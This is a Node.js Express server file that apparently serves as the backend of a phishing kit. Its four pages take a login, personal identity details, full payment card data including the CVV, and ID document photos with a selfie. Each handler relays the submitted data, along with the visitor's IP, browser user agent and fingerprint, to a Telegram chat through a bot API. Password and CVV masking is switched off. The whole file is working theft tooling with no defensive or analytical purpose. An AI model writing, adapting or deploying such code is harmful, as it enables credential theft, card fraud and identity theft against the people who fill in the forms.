/*
 * serve.js — 4 pages + form/upload relay to Telegram
 * Node 18+ (global fetch / FormData / Blob)
 *
 *   npm install
 *   TELEGRAM_BOT_TOKEN=123:ABC TELEGRAM_CHAT_ID=123456789 npm start
 *
 * Pages:  /          -> page 1  login      (public/index.html)
 *         /identity  -> page 2  identity   (public/identity.html)
 *         /card      -> page 3  card       (public/card.html)
 *         /upload    -> page 4  id upload  (public/upload.html)
 */
'use strict';

const path = require('path');
const express = require('express');
const multer = require('multer');

/* ------------------------------- config ------------------------------- */
const PORT      = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const MAX_FILE_MB = 50;
const MAX_FILES   = 12;

const MASK_SENSITIVE = false;   // true = hide password/CVV in Telegram

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[warn] TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not set — submissions will fail.');
}

/* ------------------------- file slot definitions ---------------------- */
const UPLOAD_SLOTS = [
  { name: 'front',  label: 'Front',  isSelfie: false },
  { name: 'back',   label: 'Back',   isSelfie: false },
  { name: 'selfie', label: 'Selfie', isSelfie: true  },
];

/* ------------------------- field definitions -------------------------- */
const LOGIN_FIELDS = [
  { name: 'email',    label: 'Email',    required: true },
  { name: 'password', label: 'Password', required: true, mask: true },
];

const IDENTITY_FIELDS = [
  { name: 'fullName', label: 'Full Name',         required: true },
  { name: 'address1', label: 'Address Line 1',    required: true },
  { name: 'city',     label: 'City',              required: true },
  { name: 'state',    label: 'State / Province',  required: true },
  { name: 'zipCode',  label: 'ZIP / Postal Code', required: true },
  { name: 'phone',    label: 'Phone',             required: true },
  { name: 'country',  label: 'Country',           required: true },
];

const CARD_FIELDS = [
  { name: 'fullName',         label: 'Cardholder Name',   required: true },
  { name: 'cardNumber',       label: 'Card Number',       required: true },
  { name: 'expiryMonth',      label: 'Expiry Month',      required: true },
  { name: 'expiryYear',       label: 'Expiry Year',       required: true },
  { name: 'cvv',              label: 'CVV',               required: true, mask: true },
  { name: 'csrf_token',       label: 'CSRF Token',        required: false },
  { name: 'timestamp',        label: 'Timestamp',         required: false },
  { name: 'userAgent',        label: 'User Agent',        required: false },
  { name: 'screenResolution', label: 'Screen Resolution', required: false },
];

const ID_UPLOAD_META = [
  { name: 'documentType', label: 'Document Type', required: true },
];

/* ------------------------------- app ---------------------------------- */
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', true);
app.use(express.json({ limit: '25mb' }));
app.use(express.urlencoded({ extended: true }));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: MAX_FILE_MB * 1024 * 1024, files: MAX_FILES },
}).fields([
  ...UPLOAD_SLOTS.map((s) => ({ name: s.name, maxCount: 1 })),
  { name: 'files', maxCount: MAX_FILES },
]);

/* --------------------------- Telegram helpers ------------------------- */
const apiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

const esc = (s = '') =>
  String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

async function tgCall(method, form) {
  const res  = await fetch(apiUrl(method), { method: 'POST', body: form });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    throw new Error(`Telegram ${method}: ${data.description || 'HTTP ' + res.status}`);
  }
  return data.result;
}

async function tgSendText(html) {
  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('text', html.slice(0, 4096));
  form.append('parse_mode', 'HTML');
  form.append('disable_web_page_preview', 'true');
  return tgCall('sendMessage', form);
}

async function tgSendFile(file, caption = '') {
  const isPhoto =
    file.mimetype.startsWith('image/') && file.size <= 10 * 1024 * 1024;

  const method = isPhoto ? 'sendPhoto' : 'sendDocument';
  const field  = isPhoto ? 'photo'     : 'document';

  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  if (caption) form.append('caption', caption.slice(0, 1024));
  form.append(
    field,
    new Blob([file.buffer], { type: file.mimetype || 'application/octet-stream' }),
    file.originalname || 'file'
  );

  return tgCall(method, form);
}

/* --------------------------- form plumbing ---------------------------- */
function wantsJson(req) {
  if (req.is('application/json')) return true;
  if (req.get('x-requested-with') === 'fetch') return true;
  return (req.get('accept') || '').includes('application/json');
}

function respond(req, res, status, payload) {
  if (wantsJson(req)) return res.status(status).json(payload);
  if (status >= 400) {
    return res.status(status).type('html')
      .send(`<pre style="font:14px/1.5 ui-monospace,monospace">${esc(payload.error)}</pre>`);
  }
  return res.redirect(payload.redirectTo || '/');
}

function bodySource(reqBody = {}) {
  if (reqBody && typeof reqBody.verificationData === 'object' && reqBody.verificationData !== null) {
    return reqBody.verificationData;
  }
  if (reqBody && typeof reqBody.fields === 'object' && reqBody.fields !== null) {
    return reqBody.fields;
  }
  return reqBody || {};
}

function readForm(source = {}, fields) {
  const values  = {};
  const missing = [];

  for (const f of fields) {
    let v = source[f.name];
    if (Array.isArray(v)) v = v[0];
    v = v == null ? '' : String(v).trim();
    values[f.name] = v.slice(0, 1000);
    if (f.required && !values[f.name]) missing.push(f.name);
  }
  return { values, missing };
}

function renderMessage(title, fields, values, req, extraLines = []) {
  const lines = [`<b>${esc(title)}</b>`, '━━━━━━━━━━━━━━━━━━'];

  for (const f of fields) {
    const raw = values[f.name];
    if (!raw) continue;
    const shown = f.mask && MASK_SENSITIVE ? '•'.repeat(Math.min(raw.length, 24)) : raw;
    lines.push(`<b>${esc(f.label)}:</b> <code>${esc(shown)}</code>`);
  }

  for (const line of extraLines) if (line) lines.push(line);

  lines.push('━━━━━━━━━━━━━━━━━━');
  lines.push(`🕒 ${new Date().toISOString()}`);
  const ip = req.ip || req.socket?.remoteAddress;
  if (ip) lines.push(`🌐 IP: <code>${esc(ip)}</code>`);

  return lines.join('\n');
}

function decodeBase64File(entry) {
  if (!entry || !entry.data) return null;
  const raw  = String(entry.data);
  const m    = raw.match(/^data:([^;]+);base64,(.*)$/);
  const mime = entry.type || (m && m[1]) || 'application/octet-stream';
  const b64  = m ? m[2] : raw.replace(/^data:[^;]+;base64,/, '');
  const buf  = Buffer.from(b64, 'base64');
  if (!buf.length) return null;
  return {
    originalname: entry.name || 'file',
    mimetype:     mime,
    buffer:       buf,
    size:         buf.length,
  };
}

/* ------------------------------ pages --------------------------------- */
const PAGES = {
  '/':         'index.html',
  '/identity': 'identity.html',
  '/card':     'card.html',
  '/upload':   'upload.html',
};

for (const [route, file] of Object.entries(PAGES)) {
  app.get(route, (req, res) => res.sendFile(path.join(__dirname, 'public', file)));
}

/* --------------------------- Page 1 — Login --------------------------- */
app.post('/api/login', async (req, res, next) => {
  try {
    const src = bodySource(req.body);

    const email    = String(src.email    ?? '').trim().slice(0, 200);
    const password = String(src.password ?? '').trim().slice(0, 200);

    const loginData = { email, password };

    const missing = [];
    if (!loginData.email)    missing.push('email');
    if (!loginData.password) missing.push('password');

    if (missing.length) {
      return respond(req, res, 400, {
        ok: false,
        error: `Missing required field(s): ${missing.join(', ')}`,
        missing,
      });
    }

    await tgSendText(
      renderMessage(
        '🔐 Login',
        LOGIN_FIELDS,
        { email: loginData.email, password: loginData.password },
        req
      )
    );
    console.log(`[Login] sent — email=${loginData.email}`);

    respond(req, res, 200, { ok: true, loginData, redirectTo: '/identity' });
  } catch (err) {
    next(err);
  }
});

/* --------------------------- Page 2 — Identity ------------------------ */
app.post('/api/identity', async (req, res, next) => {
  try {
    const src = bodySource(req.body);

    const fields = {
      fullName: String(src.fullName ?? '').trim(),
      address1: String(src.address1 ?? '').trim(),
      city:     String(src.city     ?? '').trim(),
      state:    String(src.state    ?? '').trim(),
      zipCode:  String(src.zipCode  ?? '').trim(),
      phone:    String(src.phone    ?? '').trim(),
      country:  String(src.country  ?? '').trim(),
    };

    const { values, missing } = readForm(fields, IDENTITY_FIELDS);

    if (missing.length) {
      return respond(req, res, 400, {
        ok: false,
        error: `Missing required field(s): ${missing.join(', ')}`,
        missing,
        fields,
      });
    }

    await tgSendText(renderMessage('🪪 Identity', IDENTITY_FIELDS, values, req));
    console.log(`[Identity] sent — ${values.fullName} (${values.city}, ${values.country})`);

    respond(req, res, 200, {
      ok: true,
      fields,
      identityData: values,
      redirectTo: '/card',
    });
  } catch (err) {
    next(err);
  }
});

/* --------------------------- Page 3 — Card ---------------------------- */
app.post('/api/card', async (req, res, next) => {
  try {
    const src = bodySource(req.body);

    const verificationData = {
      fullName:         String(src.fullName ?? '').trim().slice(0, 200),
      cardNumber:       String(src.cardNumber ?? '').replace(/\s+/g, '').slice(0, 32),
      expiryMonth:      String(src.expiryMonth ?? '').trim().slice(0, 4),
      expiryYear:       String(src.expiryYear  ?? '').trim().slice(0, 4),
      cvv:              String(src.cvv ?? '').trim().slice(0, 6),
      csrf_token:       String(src.csrf_token ?? '').trim().slice(0, 200),
      timestamp:        String(src.timestamp || new Date().toISOString()).slice(0, 64),
      userAgent:        String(src.userAgent || req.get('user-agent') || '').slice(0, 500),
      screenResolution: String(src.screenResolution ?? '').trim().slice(0, 32),
    };

    const { values, missing } = readForm(verificationData, CARD_FIELDS);

    if (missing.length) {
      return respond(req, res, 400, {
        ok: false,
        error: `Missing required field(s): ${missing.join(', ')}`,
        missing,
        verificationData,
      });
    }

    const extra = [];
    if (verificationData.csrf_token)       extra.push(`<b>CSRF Token:</b> <code>${esc(verificationData.csrf_token)}</code>`);
    if (verificationData.screenResolution) extra.push(`<b>Screen:</b> <code>${esc(verificationData.screenResolution)}</code>`);
    if (verificationData.userAgent)        extra.push(`<b>Browser UA:</b> <code>${esc(verificationData.userAgent)}</code>`);

    await tgSendText(renderMessage('💳 Card', CARD_FIELDS, values, req, extra));
    console.log(`[Card] sent — ****${verificationData.cardNumber.slice(-4)}`);

    respond(req, res, 200, {
      ok: true,
      verificationData,
      redirectTo: '/upload',
    });
  } catch (err) {
    next(err);
  }
});

/* --------------------------- Page 4 — ID upload ----------------------- */
app.post(
  '/api/id-upload',
  upload,
  async (req, res, next) => {
    try {
      const body = req.body || {};

      const { values: meta, missing } = readForm(body, ID_UPLOAD_META);
      if (missing.length) {
        return respond(req, res, 400, {
          ok: false,
          error: `Missing required field(s): ${missing.join(', ')}`,
          missing,
        });
      }

      const collected   = [];
      const multerFiles = req.files || {};

      for (const slot of UPLOAD_SLOTS) {
        const arr = multerFiles[slot.name] || [];
        for (const f of arr) {
          collected.push({ slot: slot.name, label: slot.label, isSelfie: slot.isSelfie, file: f });
        }
      }

      for (const f of multerFiles.files || []) {
        const guess = UPLOAD_SLOTS.find((s) => new RegExp(s.name, 'i').test(f.originalname));
        collected.push({
          slot:     guess ? guess.name : 'file',
          label:    guess ? guess.label : 'Document',
          isSelfie: guess ? guess.isSelfie : /selfie/i.test(f.originalname),
          file:     f,
        });
      }

      if (!collected.length && body.files && !Array.isArray(body.files) && typeof body.files === 'object') {
        for (const slot of UPLOAD_SLOTS) {
          const decoded = decodeBase64File(body.files[slot.name]);
          if (decoded) {
            collected.push({ slot: slot.name, label: slot.label, isSelfie: slot.isSelfie, file: decoded });
          }
        }
      }

      if (!collected.length && Array.isArray(body.files)) {
        for (const entry of body.files) {
          const decoded = decodeBase64File(entry);
          if (!decoded) continue;
          const guess = UPLOAD_SLOTS.find((s) => new RegExp(s.name, 'i').test(decoded.originalname));
          collected.push({
            slot:     guess ? guess.name : 'file',
            label:    guess ? guess.label : 'Document',
            isSelfie: guess ? guess.isSelfie : /selfie/i.test(decoded.originalname),
            file:     decoded,
          });
        }
      }

      if (!collected.length) {
        return respond(req, res, 400, { ok: false, error: 'No files received.' });
      }

      const presentSlots = {};
      for (const s of UPLOAD_SLOTS) {
        presentSlots[s.name] = collected.some((c) => c.slot === s.name);
      }

      const userAgent = String(body.userAgent || req.get('user-agent') || '').slice(0, 500);
      const fingerprint = String(body.Fingerprint || body.fingerprint || '').slice(0, 500);

      const hasSelfie =
        presentSlots.selfie ||
        collected.some((c) => c.isSelfie) ||
        (typeof body.hasSelfie === 'string' ? body.hasSelfie === 'true' : Boolean(body.hasSelfie));

      const verificationData = {
        documentType: meta.documentType,
        filesCount:   collected.length,
        hasSelfie:    hasSelfie,
        timestamp:    String(body.timestamp || new Date().toISOString()).slice(0, 64),
        userAgent:    userAgent,
        slots:        presentSlots,
      };
      if (fingerprint) verificationData.Fingerprint = fingerprint;

      const slotLine = UPLOAD_SLOTS
        .map((s) => `${presentSlots[s.name] ? '✅' : '⬜'} ${s.label}`)
        .join('  •  ');

      const header =
        `🪪 <b>ID Card Upload</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `<b>Document Type:</b> <code>${esc(verificationData.documentType)}</code>\n` +
        `<b>Files Count:</b> <code>${verificationData.filesCount}</code>\n` +
        `<b>Slots:</b> ${esc(slotLine)}\n` +
        `<b>Has Selfie:</b> <code>${verificationData.hasSelfie}</code>\n` +
        `<b>Timestamp:</b> <code>${esc(verificationData.timestamp)}</code>\n` +
        (userAgent   ? `<b>User Agent:</b> <code>${esc(userAgent)}</code>\n` : '') +
        (fingerprint ? `<b>Fingerprint:</b> <code>${esc(fingerprint)}</code>\n` : '') +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🌐 IP: <code>${esc(req.ip || req.socket?.remoteAddress || '')}</code>`;

      await tgSendText(header);

      let sent = 0;
      for (const c of collected) {
        const f = c.file;
        const caption =
          `🪪 ${c.label} — ${f.originalname} (${(f.size / 1024).toFixed(1)} KB)\n` +
          `Type: ${verificationData.documentType}\n` +
          `Slot: ${c.slot}${c.isSelfie ? '  •  selfie' : ''}`;
        await tgSendFile(f, caption);
        sent++;
      }

      console.log(
        `[ID Upload] sent ${sent} file(s) — doc=${verificationData.documentType} ` +
        `slots=${Object.entries(presentSlots).filter(([, v]) => v).map(([k]) => k).join('+') || 'none'}`
      );

      respond(req, res, 200, {
        ok: true,
        sent,
        verificationData,
        receivedSlots: presentSlots,
        redirectTo: '/upload',
      });
    } catch (err) {
      next(err);
    }
  }
);

/* ------------------------------ misc ---------------------------------- */
app.get('/api/health', (req, res) => {
  res.json({
    ok: true,
    telegram: Boolean(BOT_TOKEN && CHAT_ID),
    time: new Date().toISOString(),
  });
});

app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));

app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'), (err) => {
    if (err) res.status(404).type('txt').send('404 Not Found');
  });
});

app.use((err, req, res, _next) => {
  if (err instanceof multer.MulterError) {
    const msg = err.code === 'LIMIT_FILE_SIZE'
      ? `File too large (max ${MAX_FILE_MB} MB).`
      : err.message;
    return respond(req, res, 400, { ok: false, error: msg });
  }
  console.error('[error]', err);
  respond(req, res, 500, { ok: false, error: err.message || 'Server error' });
});

app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
  console.log('   /  /identity  /card  /upload');
});
